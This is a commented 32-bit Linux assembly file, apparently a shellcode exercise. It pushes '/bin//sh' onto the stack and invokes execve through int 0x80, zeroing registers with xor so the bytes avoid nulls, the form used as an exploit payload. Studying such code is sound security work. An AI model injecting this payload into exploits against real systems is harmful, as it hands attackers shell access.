section .data

section .text

global _start

_start:
; execve("/bin/sh", {"/bin/sh", NULL}, NULL);
; 11 is the code for the execve syscall
; /usr/include/i386-linux-gnu/asm/unistd_32.h
xor eax, eax
mov al, 11

; push '/bin/sh', 0x0 onto the stack
; set ebx to point to this string
xor ebx, ebx
push ebx

; //bin//sh - 2f2f 6269 6e2f 2f73 68                   
push 0x68732f2f
push 0x6e69622f
mov ebx, esp

; point ecx to array of pointers, specifically {"/bin/sh", NULL}
; construct    {"/bin/sh", NULL} on the stack using previously
; saved address of "/bin/sh" put in ebx

xor ecx, ecx
push ecx
push ebx
mov ecx, esp

xor edx, edx
int 0x80
